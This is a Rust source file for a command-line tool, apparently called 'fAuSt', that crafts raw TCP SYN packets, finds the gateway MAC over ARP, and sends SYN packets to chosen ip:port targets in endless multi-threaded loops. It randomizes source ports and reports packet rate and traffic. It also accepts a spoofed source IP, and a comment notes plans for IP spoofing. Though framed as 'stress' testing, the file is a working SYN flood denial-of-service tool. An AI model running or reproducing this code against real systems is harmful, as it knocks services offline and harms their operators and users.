extern crate pnet;
extern crate rand;

use clap::Parser;

use default_net::gateway::Gateway;
use default_net::interface::{get_default_interface, get_interfaces};

use indicatif::{HumanBytes, HumanCount};

use pnet::datalink::Channel::Ethernet;
use pnet::datalink::{self, DataLinkReceiver, DataLinkSender, MacAddr, NetworkInterface};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{self, Ipv4Flags, MutableIpv4Packet};
use pnet::packet::tcp::{self, MutableTcpPacket, TcpFlags, TcpOption};

use std::error::Error;
use std::io::{stdout, Write};
use std::net::{IpAddr, Ipv4Addr};
use std::str::FromStr;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Instant, Duration};

const ETHERNET_HEADER_LEN: usize = 14;
const ETHERNET_ARP_PACKET_LEN: usize = 42;
const IPV4_HEADER_LEN: usize = 20;
const TCP_SYN_PACKET_LEN: usize = 66;

#[derive(Debug, Clone)]
pub struct Config {
    pub iface_name: String,
    pub iface_ip: Ipv4Addr,
    pub gateway_ip: Ipv4Addr,
    pub src_mac: MacAddr,
    pub dest_mac: MacAddr,
}

#[derive(Debug, PartialEq, Clone)]
pub struct Target {
    addr: Ipv4Addr,
    port: u16,
}

// XXX: it's actually MacAddr or error (i assume, should be just a Result)
fn find_mac(
    sender: &mut Box<dyn DataLinkSender>,
    receiver: &mut Box<dyn DataLinkReceiver>,
    source_mac: MacAddr,
    source_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
) -> MacAddr {
    let mut buf = [0u8; ETHERNET_ARP_PACKET_LEN];

    // setup Ethernet header
    {
        let mut eth_header = MutableEthernetPacket::new(&mut buf[..ETHERNET_HEADER_LEN]).unwrap();

        eth_header.set_source(source_mac);
        eth_header.set_destination(MacAddr::broadcast());
        eth_header.set_ethertype(EtherTypes::Arp);
    }

    // setup ARP packet
    {
        let mut arp_packet = MutableArpPacket::new(&mut buf[ETHERNET_HEADER_LEN..]).unwrap();

        arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
        arp_packet.set_protocol_type(EtherTypes::Ipv4);
        arp_packet.set_hw_addr_len(6);
        arp_packet.set_proto_addr_len(4);
        arp_packet.set_operation(ArpOperations::Request);
        arp_packet.set_sender_hw_addr(source_mac);
        arp_packet.set_sender_proto_addr(source_ip);
        arp_packet.set_target_hw_addr(MacAddr::zero());
        arp_packet.set_target_proto_addr(target_ip);
    }

    sender.send_to(&buf, None).unwrap().unwrap();

    // XXX: loop thourgh packets with timeout
    // XXX: there's a race condition here :(
    //      we have to run reader first
    loop {
        match receiver.next() {
            Ok(buf) => {
                if let Some(arp) =
                    ArpPacket::new(&buf[MutableEthernetPacket::minimum_packet_size()..])
                {
                    if arp.get_operation() == ArpOperations::Reply
                        && arp.get_sender_proto_addr() == target_ip
                    {
                        return arp.get_sender_hw_addr();
                    }
                }
            }
            Err(e) => panic!("Error happened {}", e),
        }
    }
}

// XXX: keep configuration for IP spoofing
fn build_syn_packet(config: &Config, dest: &Target, buf: &mut [u8]) {
    let iface_ip = config.iface_ip;

    // setup Ethernet header
    {
        let mut eth_header = MutableEthernetPacket::new(&mut buf[..ETHERNET_HEADER_LEN]).unwrap();

        eth_header.set_destination(config.dest_mac);
        eth_header.set_source(config.src_mac);
        eth_header.set_ethertype(EtherTypes::Ipv4);
    }

    // setup IP header
    {
        let mut ip_header = MutableIpv4Packet::new(
            &mut buf[ETHERNET_HEADER_LEN..(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)],
        )
        .unwrap();
        ip_header.set_header_length(69);
        ip_header.set_total_length(52);
        ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip_header.set_source(iface_ip);
        ip_header.set_destination(dest.addr);
        ip_header.set_identification(rand::random::<u16>());
        ip_header.set_ttl(64);
        ip_header.set_version(4);
        ip_header.set_flags(Ipv4Flags::DontFragment);

        let checksum = ipv4::checksum(&ip_header.to_immutable());
        ip_header.set_checksum(checksum);
    }

    // setup TCP header
    {
        let mut tcp_header =
            MutableTcpPacket::new(&mut buf[(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)..]).unwrap();

        tcp_header.set_source(rand::random::<u16>());
        tcp_header.set_destination(dest.port);
        tcp_header.set_flags(TcpFlags::SYN);
        tcp_header.set_window(65535);
        tcp_header.set_data_offset(8);
        tcp_header.set_urgent_ptr(0);
        tcp_header.set_sequence(0);
        tcp_header.set_options(&[
            TcpOption::mss(1460),
            TcpOption::sack_perm(),
            TcpOption::nop(),
            TcpOption::nop(),
            TcpOption::wscale(6),
        ]);

        let checksum = tcp::ipv4_checksum(&tcp_header.to_immutable(), &iface_ip, &dest.addr);
        tcp_header.set_checksum(checksum);
    }
}

// XXX: i'm not sure if need to update identification bit from IP header
fn recycle_syn_packet(config: &Config, destination: &Target, buf: &mut [u8]) {
    // update TCP header
    {
        let mut tcp_header =
            MutableTcpPacket::new(&mut buf[(ETHERNET_HEADER_LEN + IPV4_HEADER_LEN)..]).unwrap();

        // XXX: it's likely to be much faster to cycle over shuffle vector
        tcp_header.set_source(rand::random::<u16>());
        let checksum = tcp::ipv4_checksum(
            &tcp_header.to_immutable(),
            &config.iface_ip,
            &destination.addr,
        );
        tcp_header.set_checksum(checksum);
    }
}

fn stress(
    iface: &NetworkInterface,
    config: Config,
    destinations: Vec<Target>,
    packets_sent: Arc<AtomicU64>,
) {
    let (mut tx, _) = match datalink::channel(iface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unknown channel type"),
        Err(e) => panic!("Error happened {}", e),
    };

    let num_dest = destinations.len();
    let mut buffers: Vec<[u8; TCP_SYN_PACKET_LEN]> = Vec::new();

    for ind in 0..num_dest {
        let mut buffer = [0u8; TCP_SYN_PACKET_LEN];
        // building initial packet for each destination
        build_syn_packet(&config, &destinations[ind], &mut buffer);
        buffers.push(buffer);
    }

    let mut cursor = 0;
    loop {
        // replace port field in the packet, recompute checksum
        recycle_syn_packet(&config, &destinations[cursor], &mut buffers[cursor]);
        tx.send_to(&buffers[cursor], None);
        packets_sent.fetch_add(1, Ordering::SeqCst);
        cursor = (cursor + 1) % num_dest;
    }
}

impl FromStr for Target {
    type Err = Box<dyn Error + Send + Sync + 'static>;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        let pos = s
            .find(':')
            .ok_or_else(|| format!("invalid target {}: use ip:port syntax", s))?;
        Ok(Self {
            addr: s[..pos].parse()?,
            port: s[pos + 1..].parse()?,
        })
    }
}

#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
struct Args {
    /// ip:port pair to stress out
    target: Vec<Target>,

    /// Threads used to send packets  (default=`1')
    #[clap(short = 'T', long, parse(try_from_str))]
    sender_threads: Option<u8>,

    /// Source port(s) for packets
    #[clap(short = 's', long, parse(try_from_str))]
    source_port: Option<u16>,

    /// Source address(es) for packets
    #[clap(short = 'S', long)]
    source_ip: Option<Ipv4Addr>,

    /// Specify gateway IP address
    #[clap(short = 'g', long)]
    gateway_ip: Option<Ipv4Addr>,

    /// Specify gateway MAC address
    #[clap(short = 'G', long)]
    gateway_mac: Option<MacAddr>,

    /// Specify network interface to use
    #[clap(short = 'i', long)]
    interface: Option<String>,
}

fn resolve_iface(args: &Args) -> (NetworkInterface, Config) {
    let iface_name: String = args
        .interface
        .clone()
        .or_else(|| match get_default_interface() {
            Ok(iface) => Some(iface.name),
            // XXX: better error message
            _ => None,
        })
        // XXX: better error message
        .unwrap();

    let dinterface = get_interfaces()
        .into_iter()
        .find(|iface| iface.name == iface_name)
        // XXX: better error message
        .unwrap();

    // XXX: no need to search the same thing twice
    let interfaces = datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|iface| iface.name == iface_name)
        .unwrap();

    let iface_ip: Ipv4Addr = args
        .source_ip
        .clone()
        .or_else(|| {
            interface
                .ips
                .iter()
                // XXX: we could make use of multiple IPs BTW
                .filter_map(|network| match network.ip() {
                    IpAddr::V4(ipv4) => Some(ipv4),
                    _ => None,
                })
                .next()
        })
        .expect(&format!(
            "the interface {} does not have any IPv4 addresses",
            iface_name
        ));

    let gateway_ip = args
        .gateway_ip
        .clone()
        .or_else(|| match dinterface.gateway {
            Some(Gateway { ip_addr, .. }) => {
                if let IpAddr::V4(ip_addr) = ip_addr {
                    Some(ip_addr)
                } else {
                    None
                }
            }
            _ => None,
        })
        .expect("Default gateway cannot be detected");

    let source_mac = interface.mac.unwrap();
    let destination_mac = args
        .gateway_mac
        .clone()
        .or_else(|| {
            let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
                Ok(Ethernet(tx, rx)) => (tx, rx),
                Ok(_) => panic!("Unknown channel type"),
                Err(e) => panic!("Error happened {}", e),
            };
            // XXX: only replace dest IP with gateway IP if it's not broadcast
            //      (i assume it should just fail write away on broadcast)
            Some(find_mac(&mut tx, &mut rx, source_mac, iface_ip, gateway_ip))
        })
        .unwrap();

    (
        interface,
        Config {
            iface_name,
            iface_ip,
            gateway_ip,
            src_mac: source_mac,
            dest_mac: destination_mac,
        },
    )
}

fn main() {
    let args = Args::parse();

    println!(
        r"
   ____       ________   ____                 __ 
  / __ \_  __/ __/ __/  / __/___ ___  _______/ /_
 / / / / |/_/ /_/ /_   / /_/ __ `/ / / / ___/ __/
/ /_/ />  </ __/ __/  / __/ /_/ / /_/ (__  ) /_  
\____/_/|_/_/ /_/    /_/  \__,_/\__,_/____/\__/  
    "
    );

    print!("Preparing config...");
    stdout().flush().unwrap();

    let (interface, config) = resolve_iface(&args);

    println!(" DONE");
    println!(
        "Source:\n  iface {}\n  inet {}\n  gw {}\n  ether {}\n  dest {}\n",
        config.iface_name, config.iface_ip, config.gateway_ip, config.src_mac, config.dest_mac,
    );

    let packets_sent = Arc::new(AtomicU64::new(0));

    let mut handles = Vec::new();
    let num_workers = args.sender_threads.unwrap_or(1);
    let interface = Arc::new(interface);
    for _ in 0..num_workers {
        let interface = Arc::clone(&interface);
        let packets_sent = Arc::clone(&packets_sent);
        let config = config.clone();
        let targets = args.target.clone();
        handles.push(thread::spawn(move || {
            stress(&interface, config, targets, packets_sent)
        }));
    }

    let packets_sent = Arc::clone(&packets_sent);
    let progress_printer = thread::spawn(move || {
        let start = Instant::now();
        loop {
            thread::sleep(Duration::from_secs(1));
            let sent = packets_sent.load(Ordering::Relaxed);
            let elapsed_seconds = start.elapsed().as_secs();
            println!(
                "==> {}s sent: {} ({} pps) traffic: {} ({}/s)",
                elapsed_seconds,
                HumanCount(sent).to_string(),
                HumanCount(sent / elapsed_seconds).to_string(),
                HumanBytes(sent * TCP_SYN_PACKET_LEN as u64).to_string(),
                HumanBytes(sent * TCP_SYN_PACKET_LEN as u64 / elapsed_seconds).to_string()
            );
        }
    });

    // now we can join all threads
    for handle in handles.into_iter() {
        handle.join().unwrap();
    }
    progress_printer.join().unwrap();
}
